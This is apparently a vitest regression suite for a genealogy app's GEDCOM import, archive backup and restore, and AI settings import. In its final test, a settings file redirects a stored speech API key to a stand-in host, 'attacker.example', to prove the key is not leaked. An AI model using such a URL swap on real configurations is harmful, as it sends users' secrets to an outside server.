// Import, export and keeping: where a family's data can be lost or broken in this corner of the app.
// Each case was written as it.fails while the code did the wrong thing; it now guards the fix.
import { createHash } from 'node:crypto'
import { createWriteStream, existsSync, mkdirSync, readFileSync, rmSync, writeFileSync } from 'node:fs'
import fs from 'node:fs/promises'
import path from 'node:path'
import { pipeline } from 'node:stream/promises'
import { eq } from 'drizzle-orm'
import yazl from 'yazl'
import { afterAll, beforeAll, describe, expect, it, vi } from 'vitest'
import { DATA_DIR, getDb, MEDIA_DIR, schema } from '../lib/db'
import { applyPendingRestore, PENDING } from '../lib/db/restore'
import { archiveStream, stageRestore } from '../lib/ops/archive'
import { OpError, undo, withHistoryScope, type Actor } from '../lib/ops/core'
import { importGedcom, previewGedcom } from '../lib/ops/gedcom'
import * as people from '../lib/ops/people'
import { describeOp } from '../lib/ops/proposals'
import { listHistory } from '../lib/ops/settings'
import { fromGedDate, toGedDate } from '../lib/gedcom'
import { detectKind, rowsToText } from '../lib/import-formats'
import { exportAiSettings, importAiSettings } from '../lib/ops/ai-config'
import { removeTranscription, saveTranscription } from '../lib/transcribe/service'

const owner: Actor = { userId: 'u-corner-owner', name: 'Ольга', role: 'owner', personId: null }

// Everything scratch goes here, inside the checkout.
const work = path.join(process.cwd(), '.work', `corner-transfer-${process.pid}`)
const sha = (b: Buffer) => createHash('sha256').update(b).digest('hex')
const countPeople = () => getDb().select({ id: schema.persons.id }).from(schema.persons).all().length
const newestHistory = () => listHistory(owner, 1)[0]?.id ?? null

const ONE_PERSON = `0 HEAD
1 GEDC
2 VERS 5.5.1
0 @I1@ INDI
1 NAME Иван /Заменин/
1 SEX M
0 TRLR`
const NOBODY = `0 HEAD
1 GEDC
2 VERS 5.5.1
0 TRLR`

async function saveArchive(name = 'copy.zip') {
  const file = path.join(work, name)
  const { stream } = await archiveStream(owner)
  await pipeline(stream, createWriteStream(file))
  return file
}

/** A zip built by hand, so it can leave out exactly what it wants to. */
async function forgedArchive(name: string, files: Record<string, Buffer>) {
  const zip = new yazl.ZipFile()
  for (const [n, b] of Object.entries(files)) zip.addBuffer(b, n, { compress: false })
  const list = Object.entries(files).map(([p, b]) => ({ path: p, size: b.length, sha256: sha(b) }))
  zip.addBuffer(Buffer.from(JSON.stringify({ format: 1, createdAt: '', schema: 0, files: list } satisfies Record<string, unknown>)), 'manifest.json', { compress: false })
  zip.end()
  const file = path.join(work, name)
  await pipeline(zip.outputStream, createWriteStream(file))
  return file
}

async function databaseCopy() {
  const file = path.join(work, `family-${Date.now()}-${Math.random().toString(36).slice(2)}.db`)
  await getDb().$client.backup(file)
  return fs.readFile(file)
}

const keepEnv: Record<string, string | undefined> = {}
beforeAll(() => {
  mkdirSync(work, { recursive: true })
  for (const k of ['STT_PROVIDER', 'STT_API_KEY', 'FACE_PROVIDER', 'FACE_API_KEY', 'FACE_API_SECRET']) {
    keepEnv[k] = process.env[k]
    delete process.env[k]
  }
})

afterAll(() => {
  rmSync(work, { recursive: true, force: true })
  for (const [k, v] of Object.entries(keepEnv)) if (v === undefined) delete process.env[k]; else process.env[k] = v
})

describe('GEDCOM: replacing the tree', () => {
  it('a merge fills a death date and marks the card dead, as it should', () => {
    const p = people.createPerson(owner, { givenName: 'Смертий', surname: 'Заполненный', sex: 'M', birthDate: '1910', living: true })
    const r = importGedcom(owner, `0 HEAD\n0 @I1@ INDI\n1 NAME Смертий /Заполненный/\n1 SEX M\n1 BIRT\n2 DATE 1910\n1 DEAT\n2 DATE 1980\n0 TRLR`, 'merge')
    expect(r.merged).toBe(1)
    expect(people.getPersonRow(p.id)).toMatchObject({ living: false, deathDate: '1980' })
  })

  it('a replace import refuses a file that names nobody instead of emptying the archive', () => {
    // A truncated or wrong file (no INDI at all) is still a valid "replace": today it deletes everyone.
    const before = countPeople()
    expect(before).toBeGreaterThan(0)
    let error: unknown = null
    let wiped = false
    try {
      importGedcom(owner, NOBODY, 'replace')
      wiped = countPeople() < before
    } catch (e) {
      error = e
    }
    if (wiped) {
      const id = newestHistory()
      if (id) undo(owner, id, 'cleanup')
    }
    expect(error, 'the file names nobody; replacing with it loses the whole tree').toBeInstanceOf(OpError)
    expect(countPeople()).toBe(before)
  })

  it('undoing a replace import brings the accounts their cards back', async () => {
    // accountsLetGo() writes to users/invites/views directly, outside Changes, so history never records it.
    const p = people.createPerson(owner, { givenName: 'Учётная', surname: 'Запись', sex: 'F', birthDate: '1950', deathDate: '2000' })
    const uid = 'u-corner-account'
    getDb().insert(schema.user).values({ id: uid, name: 'Учётная', email: 'corner-account@example.org', role: 'editor', personId: p.id, createdAt: new Date(), updatedAt: new Date() }).run()
    const { historyId } = await withHistoryScope(() => importGedcom(owner, ONE_PERSON, 'replace'))
    expect(historyId).toBeTruthy()
    undo(owner, historyId!, 'undo the replace')
    const row = getDb().select({ personId: schema.user.personId }).from(schema.user).where(eq(schema.user.id, uid)).get()
    expect(row?.personId, 'the owner came back after undo, but nobody is linked to their card any more').toBe(p.id)
  })

  it('a family that names one person as both parents does not marry them to themself', () => {
    const text = `0 HEAD
0 @I1@ INDI
1 NAME Один /Сам/
1 SEX M
0 @F1@ FAM
1 HUSB @I1@
1 WIFE @I1@
0 TRLR`
    importGedcom(owner, text, 'add')
    const id = newestHistory()
    try {
      const self = getDb().select().from(schema.unions).all().filter((u) => u.aId === u.bId)
      expect(self, 'a person is recorded as their own spouse').toEqual([])
    } finally {
      if (id) undo(owner, id, 'cleanup')
    }
  })

  it('a family whose parents are missing does not add a person the preview never counted', () => {
    const text = `0 HEAD
0 @I1@ INDI
1 NAME Первый /Сирота/
0 @I2@ INDI
1 NAME Второй /Сирота/
0 @F1@ FAM
1 CHIL @I1@
1 CHIL @I2@
0 TRLR`
    const before = countPeople()
    const preview = previewGedcom(owner, text)
    importGedcom(owner, text, 'add')
    const id = newestHistory()
    try {
      expect(countPeople() - before, 'the import added a card the preview did not report').toBe(preview.persons)
    } finally {
      if (id) undo(owner, id, 'cleanup')
    }
  })

  it('a merge keeps a death the file states without a date', () => {
    // DEAT Y says the person died, but the gap-filling code only looks at deathDate, so the card stays "living".
    const p = people.createPerson(owner, { givenName: 'Яков', surname: 'Бездатный', sex: 'M', birthDate: '1900', living: true })
    const r = importGedcom(owner, `0 HEAD\n0 @I1@ INDI\n1 NAME Яков /Бездатный/\n1 SEX M\n1 BIRT\n2 DATE 1900\n1 DEAT Y\n0 TRLR`, 'merge')
    expect(r.merged).toBe(1)
    expect(people.getPersonRow(p.id).living, 'the file says he died; the card keeps him among the living').toBe(false)
  })
})

describe('GEDCOM: dates that come back changed', () => {
  it('a free-text date does not grow brackets on every round trip', () => {
    // toGedDate wraps anything it does not parse in (...), and fromGedDate keeps those brackets, so each
    // export+import adds another pair: "?" becomes "(?)" then "((?))" and so on.
    for (const d of ['?', 'ок. 1890']) {
      const once = fromGedDate(toGedDate(d))
      const twice = fromGedDate(toGedDate(once))
      expect(twice, `${d} became ${once} and then ${twice}`).toBe(once)
    }
  })

  it('a month that does not exist is never written as "undefined"', () => {
    // A typo such as 31.13.1900 passes the shape check and indexes past the month table.
    expect(toGedDate('31.13.1900')).not.toMatch(/undefined/)
  })
})

describe('GEDCOM: a file the family cannot read reliably', () => {
  it('a file that gives two records the same id is refused, not half-linked', () => {
    const text = `0 HEAD
0 @I1@ INDI
1 NAME Анна /Двойная/
1 SEX F
0 @I1@ INDI
1 NAME Иван /Двойной/
1 SEX M
0 @I2@ INDI
1 NAME Ребёнок /Двойной/
0 @F1@ FAM
1 HUSB @I1@
1 WIFE @I1@
1 CHIL @I2@
0 TRLR`
    let error: unknown = null
    let id: string | null = null
    try {
      importGedcom(owner, text, 'add')
      id = newestHistory()
    } catch (e) {
      error = e
    }
    try {
      expect(error, 'two INDI records share @I1@; the links silently pick one of them').toBeInstanceOf(OpError)
    } finally {
      if (id) undo(owner, id, 'cleanup')
    }
  })

  it('the assistant is told that a replace import deletes the tree before it asks', () => {
    const said = describeOp(owner, 'import_gedcom', { text: ONE_PERSON, mode: 'replace' })
    expect(said.toLowerCase()).toMatch(/замен|replace|удал|delete|overwrit/)
  })
})

describe('tables and text files', () => {
  it('a table whose first header is "family" is still read as a table', () => {
    // detectKind only skips table sniffing when the first line starts with the word "family", which a
    // perfectly ordinary English header ("family,born") does too.
    expect(detectKind('people.txt', 'family,born,died\nИванов,1900,1950')).toBe('table')
    // A line of the text format with one comma stays text.
    expect(detectKind('people.txt', 'Иван Петров, 1890\n  Мария, 1895')).not.toBe('table')
  })

  it('a repeated id makes the relative ambiguous instead of silently pointing at the last row', () => {
    // Two rows share id 1; the mother cell "1" is resolved to the second of them and no warning is given.
    const r = rowsToText([['1', 'Иван Белов', ''], ['1', 'Пётр Белов', ''], ['2', 'Анна Белова', '1']], ['id', 'name', 'mother'])
    const said = r.warnings.map((w) => `${w.key} ${w.detail ?? ''}`).join(' ')
    expect(said, 'a duplicate id in the file was not reported').toMatch(/id|номер|повтор|одинаков|duplicate/i)
  })
})

describe('a saved copy of the whole archive', () => {
  it('a copy is refused when a photo the database names is missing from it', async () => {
    // The manifest only promises what it lists; nothing checks that every media row's file is in the zip.
    const mediaId = 'corner-photo'
    getDb().insert(schema.media).values({ id: mediaId, filename: `${mediaId}.orig.jpg`, mime: 'image/jpeg' }).run()
    let error: unknown = null
    try {
      await stageRestore(await forgedArchive('missing-photo.zip', { 'family.db': await databaseCopy() }))
    } catch (e) {
      error = e
    } finally {
      await fs.rm(path.join(DATA_DIR, PENDING), { recursive: true, force: true })
      getDb().delete(schema.media).where(eq(schema.media.id, mediaId)).run()
    }
    expect(error, 'the copy was accepted although a photo its database names is not in it').toBeTruthy()
  })

  it('an archive the app itself wrote can always be restored', async () => {
    // Export takes every file in the photo folder; restore only accepts names without a leading dot.
    const stray = path.join(MEDIA_DIR, '.DS_Store')
    writeFileSync(stray, 'a file Finder leaves behind')
    let error: unknown = null
    try {
      const zip = await saveArchive('stray-dotfile.zip')
      try {
        await stageRestore(zip)
      } catch (e) {
        error = e
      }
    } finally {
      rmSync(stray, { force: true })
      await fs.rm(path.join(DATA_DIR, PENDING), { recursive: true, force: true })
    }
    expect(error, 'the export carried a name its own restore refuses').toBeNull()
  })

  it('a crash halfway through the swap does not throw away the only previous copy', () => {
    // applyPendingRestore deletes backups/before-restore first, then finishes moving. A restart after the old
    // database and photos were moved but before the new ones were leaves nothing to go back to.
    const dir = path.join(work, 'swap-crash')
    rmSync(dir, { recursive: true, force: true })
    const put = (p: string, text: string) => {
      mkdirSync(path.dirname(path.join(dir, p)), { recursive: true })
      writeFileSync(path.join(dir, p), text)
    }
    put('backups/before-restore/family.db', 'old archive')
    put('backups/before-restore/media/a.jpg', 'old photo')
    put(`${PENDING}/family.db`, 'new archive')
    put(`${PENDING}/media/b.jpg`, 'new photo')

    applyPendingRestore(dir)

    expect(existsSync(path.join(dir, 'backups/before-restore/family.db')), 'the copy made before the restore is gone').toBe(true)
    expect(readFileSync(path.join(dir, 'backups/before-restore/family.db'), 'utf8')).toBe('old archive')
  })
})

describe('the AI settings file and the keys it must not move', () => {
  it('a settings file cannot point a saved speech key at another server', async () => {
    // The file carries no key, so the import reuses the one stored for "custom" — while taking the base URL
    // from the file. saveTranscription() then checks the key against that new host, sending it there.
    const calls: string[] = []
    const spy = vi.spyOn(globalThis, 'fetch').mockImplementation((async (url: string) => {
      calls.push(String(url))
      return new Response('{}', { status: 200 })
    }) as never)
    try {
      removeTranscription(owner)
      await saveTranscription(owner, { provider: 'custom', baseUrl: 'https://mine.example/v1', key: 'sk-corner-secret-123456' })
      calls.length = 0
      await importAiSettings(owner, { folkbranch: 'ai-settings', version: 1, speech: { provider: 'custom', baseUrl: 'https://attacker.example/v1' } })
      expect(calls.some((u) => u.includes('attacker.example')), 'the saved speech key was sent to a host named by the file').toBe(false)
      expect(exportAiSettings(owner).speech?.baseUrl, 'the file moved the speech server').toBe('https://mine.example/v1')
    } finally {
      removeTranscription(owner)
      spy.mockRestore()
    }
  })
})
